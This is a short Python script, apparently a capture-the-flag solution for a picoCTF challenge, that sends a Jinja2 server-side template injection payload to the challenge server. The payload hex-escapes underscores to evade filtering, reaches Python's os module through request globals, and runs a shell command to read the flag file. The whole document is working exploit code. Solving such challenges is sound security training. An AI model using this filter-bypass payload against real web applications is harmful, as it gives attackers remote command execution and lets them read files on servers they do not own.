import requests
import re
import html

url = 'http://shape-facility.picoctf.net:57222/'
s = requests.Session()

payload = '''{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}'''

res = requests.post(url, data={'content': payload})

try:
    result = re.findall(r'center">(.+)</h1>', res.text)[0]
    print(html.unescape(result))
except:
    print(res.text)